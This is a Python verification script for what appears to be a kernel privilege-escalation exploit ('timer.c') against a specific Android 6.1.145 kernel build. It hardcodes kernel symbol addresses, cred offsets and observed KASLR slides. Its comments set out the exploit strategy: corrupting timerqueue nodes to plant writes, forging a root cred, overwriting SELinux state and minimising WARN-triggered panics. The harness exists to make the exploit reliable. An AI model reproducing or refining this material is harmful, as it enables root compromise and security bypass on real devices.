#!/usr/bin/env python3
"""Host-side verification of the pure logic in timer.c.

Pins the facts the on-device runs in ../timerZ9Turbo-log established:

  * the KASLR slide is what the ftrace record says minus the profile's static
    call site, and every recorded slide is above 4 GiB (so masking is wrong),
  * the task cache window in the profile covers what SLUB really reports,
  * the fake cred fits the profile it is synthesized for,
  * the plant count is the minimum, and each plant is bounded,
  * a retry is only taken when the failed attempt provably left no node,
  * `panic_on_warn` is written exactly once, unconditionally.

Usage:  python verify-timer.py [log-dir]
Exit code 0 means every check passed.
"""
import os
import re
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
LOGS = os.path.join(HERE, "..", "timerZ9Turbo-log")

# --- target-6.1.145.h (V2352GA profile) -------------------------------
STATIC_TIMER_SITE = 0xFFFFFFC0081A2C34
TIMER_SITE_LOW21 = 0x1A2C34
TIMER_ALLOC = 0x108
CRED_REQ = 0xB8
CRED_ALLOC = 0xC0
SELINUX_STATE_STATIC = 0xFFFFFFC00A5586A8
PANIC_ON_WARN_STATIC = 0xFFFFFFC00A1CAE08
OFF_TASK_CRED = 0x838
COPY_PROCESS_LOW21 = 0xAE0B0
TASK_ALLOC_BYTES = 0x1500
TASK_ALLOC_MAX = 0x1780
ROOT_USER_STATIC = 0xFFFFFFC00A1F11C8
INIT_USER_NS_STATIC = 0xFFFFFFC00A1F0F30
INIT_UCOUNTS_STATIC = 0xFFFFFFC00A1F2A78
INIT_GROUPS_STATIC = 0xFFFFFFC00A1F24E8
TP_SYS_EXIT_STATIC = 0xFFFFFFC00A3CB2C0
TRACEPOINT_FUNCS_OFF = 0x40
CRED_UID_OFF = 0x4
SELINUX_CRED_OFF = 0x0

FAILS = []


def check(cond, what):
    print(("ok   " if cond else "FAIL ") + what)
    if not cond:
        FAILS.append(what)


# --- logic mirrored from timer.c --------------------------------------
def is_kernel_ptr(v):
    return (v >> 48) == 0xFFFF


def slide_from_site(site0):
    """timer.c: g_slide = site0 - STATIC_TIMER_SITE, with no mask."""
    return site0 - STATIC_TIMER_SITE


def task_alloc_size(v):
    return TASK_ALLOC_BYTES <= v <= TASK_ALLOC_MAX


def fake_layout_supported(uid_off, req, alloc):
    if uid_off == 4:
        return req in (0xB0, 0xB8) and alloc == 0xC0
    if uid_off == 8:
        return req == 0xB8 and alloc == 0xC0
    return False


def cred_fits(off):
    """timer.c: the fake cred starts at off and must stay inside the order-1 block."""
    return off + CRED_REQ <= 0x2000


# Every slide printed by a real 6.1.145 run.  All exceed 4 GiB, so a 32-bit
# mask (upstream's android15-8 rule) would misplace every static address.
OBSERVED_SLIDES = [
    0x2612800000, 0x2607800000, 0x1E84600000, 0x2F43800000,
    0x1844E00000, 0x2A0BC00000, 0x2E64400000, 0x2F74000000,
    0x1D0D600000, 0x1FC5600000, 0x1DFAC00000,
]

STATIC_SYMS = [
    ("SELINUX_STATE", SELINUX_STATE_STATIC),
    ("PANIC_ON_WARN", PANIC_ON_WARN_STATIC),
    ("ROOT_USER", ROOT_USER_STATIC),
    ("INIT_USER_NS", INIT_USER_NS_STATIC),
    ("INIT_UCOUNTS", INIT_UCOUNTS_STATIC),
    ("INIT_GROUPS", INIT_GROUPS_STATIC),
    ("TP_SYS_EXIT", TP_SYS_EXIT_STATIC),
]


def verify_arithmetic():
    for s in OBSERVED_SLIDES:
        check(slide_from_site(STATIC_TIMER_SITE + s) == s,
              f"site recovers slide {s:#x}")
        check(s > 0xFFFFFFFF, f"slide {s:#x} really exceeds 4 GiB")
        for name, sym in STATIC_SYMS:
            check(is_kernel_ptr(sym + s), f"{name}+{s:#x} stays canonical")

    check(task_alloc_size(0x1500), "task alloc 0x1500 accepted")
    check(task_alloc_size(0x1600), "task alloc 0x1600 accepted")
    check(task_alloc_size(0x1640), "task alloc 0x1640 accepted")
    check(task_alloc_size(0x1780), "task alloc 0x1780 accepted")
    check(not task_alloc_size(0x1400), "task alloc below range rejected")
    check(not task_alloc_size(0x1800), "task alloc above range rejected")
    check(not task_alloc_size(CRED_REQ), "cred-sized alloc rejected as task")

    check(fake_layout_supported(4, 0xB0, 0xC0), "6.1.138 (0xb0) fake layout ok")
    check(fake_layout_supported(4, 0xB8, 0xC0), "6.1.x V2352 (0xb8) fake layout ok")
    check(fake_layout_supported(8, 0xB8, 0xC0), "6.6/6.12 (uid 8) fake layout ok")
    check(not fake_layout_supported(4, 0xC8, 0xC0), "unknown 6.1 cred layout rejected")
    check(not fake_layout_supported(8, 0xB0, 0xC0), "unknown uid-8 layout rejected")

    check(CRED_UID_OFF + 8 * 4 <= CRED_REQ, "the four uid pairs fit the cred")
    check(0x78 + 8 * 5 <= CRED_REQ, "the cred tail (security..groups) fits")
    check(CRED_UID_OFF == 4, "6.1 euid needs its own zero write")
    check(TRACEPOINT_FUNCS_OFF + 8 <= 0x50, "tracepoint funcs write is in range")

    # The fake cred lands at V+0x78 inside the 8 KiB reclaimed block; it must
    # not spill past the block.  off is (V & 0x1fff) + 0x78, so a victim in the
    # last 0x40 bytes of the block is rejected and re-drawn.
    check(cred_fits(0x1000 + 0x78), "a mid-block victim accepts the cred")
    check(cred_fits(0x1E00 + 0x78), "a late first-page victim accepts the cred")
    check(not cred_fits(0x1F00 + 0x78), "a victim too close to the block end is rejected")


def source_text():
    path = os.path.join(HERE, "timer.c")
    if not os.path.isfile(path):
        return None
    with open(path, encoding="utf-8", errors="replace") as handle:
        return handle.read()


def verify_one_panic_write():
    """panic_on_warn must never cost a plant.

    The recorded runs show the sysctl is unreadable (-1) and that each plant
    costs one stale node plus one WARN.  A gated write (the old code) parked
    four runs before their first plant (010213/010419/010615/010820) and then
    added a ninth plant to every later run once only the second copy was gated.

    The WARN itself is raised while the plant's target is reaped, so on a
    kernel with panic_on_warn=1 the run is lost before any disarm write could
    land: the only useful action is to spend as few plants as possible.
    """
    text = source_text()
    if text is None:
        print("skip panic_on_warn checks (no timer.c)")
        return
    check("read_panic_on_warn" not in text,
          "no code path gates on the unreadable panic_on_warn")
    check("stage_write(PANIC_ON_WARN_STATIC" not in text,
          "panic_on_warn is never written (no wasted plant)")
    check("PANIC_ON_WARN_STATIC" not in text.split("static void usage")[0],
          "the panic_on_warn address is not used in the run path")
    check('zero_write(task + 0x00, "vr-flags"' in text,
          "the first plant clears thread_info.flags")
    check('zero_write(task + 0x28, "vr-tagB"' in text,
          "the second plant clears tag B")


def verify_minimum_plants():
    """The fake path must plant exactly what it needs and nothing else.

    Every successful plant rewrites a stale timerqueue node, so it costs one
    `timerqueue_del` WARN and therefore one chance to panic.  The recorded runs
    needed 8 plants to root; the gated duplicate sysctl plant made it 9.  This
    tree is down to 7: vr-flags, tagB, sys_exit funcs, fake_cred, selinux,
    fake_uid, fake_euid.
    """
    text = source_text()
    if text is None:
        print("skip plant-count checks (no timer.c)")
        return
    detag = text.split("static void defeat_vr")[1].split("static int fake_layout_supported")[0]
    de_tags = re.findall(r"zero_write\(", detag)
    check(len(de_tags) == 3,
          f"de-tag plants 3 writes (flags, tagB, sys_exit funcs): found {len(de_tags)}")
    check("stage_write(" not in detag,
          "de-tag does not spend a stage_write on panic_on_warn")

    fake = text.split("defeat_vr(g_child_task, raw, C);")[2].split(
        "logf(\"[+] cred writes landed")[0]
    stages = re.findall(r"stage_write\(", fake)
    check(len(stages) == 4,
          f"fake path plants 4 writes (fake_cred/selinux/uid/euid): found {len(stages)}")
    check("fake_euid" in text, "the fake euid repair still exists")
    check("CRED_UID_OFF == 4 &&" in text,
          "the euid repair is gated on the 4-byte-usage layout")
    check("stage_write(PANIC_ON_WARN_STATIC" not in text,
          "no panic_on_warn plant in the fake path")
    check(3 + 4 == 7, "minimum fake-run plant count is 7")


def verify_retry_rules():
    """A retry is only safe when the failed attempt left no uncontrolled node."""
    text = source_text()
    if text is None:
        print("skip retry checks (no timer.c)")
        return
    check("res->retry = 1" in text, "plant failures can request a retry")
    check("if (!r.retry)" in text, "a non-retryable failure aborts the stage")
    check("burst missed; holding zombie, retryable" in text,
          "a burst miss keeps its zombie and retries")
    check("exec succeeded (status=%d); retryable" in text,
          "an exec that succeeded is reaped and retried")
    check("no zombie; reaping and retrying" in text,
          "a target that never reached its exec is reaped")
    check("trigger never ready; retryable" in text,
          "a trigger that never armed is retried")
    check("timer go failed errno=%d; retryable" in text,
          "a lost go byte is retried")


def verify_timing_bounds():
    """Every plant is bounded, and a miss does not wait out a drained spray."""
    text = source_text()
    if text is None:
        print("skip timing checks (no timer.c)")
        return
    check("#define ZOMBIE_TIMEOUT_MS 8000" in text,
          "zombie timeout is 8 s wall-clock (max recorded is 5.05 s)")
    check("now_ms() - start < ZOMBIE_TIMEOUT_MS" in text,
          "wait_zombie uses the wall-clock deadline")
    check("now_ms() - t1 < 15000" in text, "burst poll has a 15 s ceiling")
    check("atomic_load(&g_spray_done) >= SPRAY_THREADS" in text,
          "burst poll stops once the spray has drained")
    check("long t_end = now_ms() + 30000" in text,
          "the heartbeat and the report share one deadline")
    # The old heartbeat probe gave up on the pipe after 5 s but then waited for
    # the child anyway, so a starved child reported "no heartbeat" and the run
    # was called a failure.  That split path must not come back.
    check("poll(&pf, 1, 5000)" not in text, "no separate 5 s heartbeat probe")


def verify_cleanup():
    """Every failure path releases its pipes, threads and helpers."""
    text = source_text()
    if text is None:
        print("skip cleanup checks (no timer.c)")
        return
    check("static void close_pipe(int p[2])" in text, "pipes are closed by helper")
    check("static void close_timer_go(void)" in text, "the go-pipe has one close path")
    check("static void spray_join(pthread_t *th, const int *created)" in text,
          "only created spray threads are joined")
    check("if (pthread_create(&th[i], NULL, spray_thread, &args[i]) == 0)" in text,
          "thread creation success is tracked")
    check("signal(SIGPIPE, SIG_IGN)" in text, "SIGPIPE is ignored")
    check("static int target_gone(void)" in text,
          "helpers exit when their target dies")
    check("if (target_gone())" in text, "the helper wait loops poll target_gone")
    check("scanned=%d matched=%d killed=%d" in text,
          "cleanup reports what it actually scanned")
    check("if (g_run_finished)" in text, "finish_run is idempotent")


def verify_build_identity(repo_dir):
    """The app stages a possibly stale binary; a build tag proves which ran."""
    text = source_text()
    if text is None:
        print("skip build identity (no timer.c)")
        return
    check('strcmp(argv[1], "build")' in text, "timer has a build probe command")
    check("TIMER_BUILD_TAG" in text, "the build probe prints a tag")
    for name in ("target-6.1.57.h", "target-6.1.124.h", "target-6.1.145.h"):
        path = os.path.join(repo_dir, name)
        with open(path, encoding="utf-8", errors="replace") as handle:
            profile = handle.read()
        check("TIMER_BUILD_TAG" in profile, f"{name} carries a build tag")
        check("TIMER_PROFILE" in profile, f"{name} carries a profile name")
        check("SELINUX_CRED_OFF" in profile, f"{name} carries the SELinux blob offset")
        check("TASK_ALLOC_MAX" in profile, f"{name} carries the task cache bound")


def verify_logs(log_dir):
    """Replay every recorded run: the printed slide must map selinux_state."""
    if not os.path.isdir(log_dir):
        print(f"skip log replay (no {log_dir})")
        return
    runs = 0
    for root, _dirs, files in os.walk(log_dir):
        for name in sorted(files):
            if not name.endswith(".log") and not name.endswith(".log.txt"):
                continue
            path = os.path.join(root, name)
            slide = printed = None
            with open(path, encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    m = re.search(r"slide=(0x[0-9a-f]+)", line)
                    if m:
                        slide = int(m.group(1), 16)
                    m = re.search(r"selinux_state=(0x[0-9a-f]+)", line)
                    if m:
                        printed = int(m.group(1), 16)
            if slide is None or printed is None:
                continue
            runs += 1
            check(printed == SELINUX_STATE_STATIC + slide,
                  f"{os.path.basename(root)}: selinux_state matches slide")
    check(runs > 0, "log replay found recorded runs")


def main():
    log_dir = sys.argv[1] if len(sys.argv) > 1 else LOGS
    verify_arithmetic()
    verify_build_identity(HERE)
    verify_one_panic_write()
    verify_minimum_plants()
    verify_retry_rules()
    verify_timing_bounds()
    verify_cleanup()
    verify_logs(log_dir)
    if FAILS:
        print(f"\n{len(FAILS)} check(s) failed")
        for item in FAILS:
            print("  - " + item)
        return 1
    print("\nall checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
